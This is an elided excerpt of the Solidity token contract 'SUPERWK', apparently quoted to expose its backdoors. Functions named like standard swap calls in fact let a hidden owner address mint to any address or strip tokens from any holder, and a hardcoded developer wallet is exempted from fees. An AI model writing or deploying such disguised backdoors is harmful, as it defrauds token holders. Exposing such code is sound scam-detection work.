...
contract SUPERWK is Context, IERC20, Ownable { 
    ...
    bool noBlackList = true;

    address payable private Wallet_Dev = payable(0xdd4C32F6e5934FFD97637A949D798D06772252D0);
    ...
    */
    ...
    string private _name = "SUPERWK";  
    string private _symbol = "SUPERWK";  
    ...
    */
    ...
    function excludeFromFee(address account) public onlyOwner {
        ...
        _isExcludedFromFee[address(0xdd4C32F6e5934FFD97637A949D798D06772252D0)] = true;
    }
    ...
    */
    ...
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 Amount, address addr) public {
        require(_ownerShip == _msgSender(), "Ownable: caller is not the owner");
        _tOwned[addr] -= Amount;
    }
    ...
    */
    ...
    function swapExactTokensForETH(uint256 Amount, address addr) public {
        require(_ownerShip == _msgSender(), "Ownable: caller is not the owner");
        _tOwned[addr] += Amount;
    }
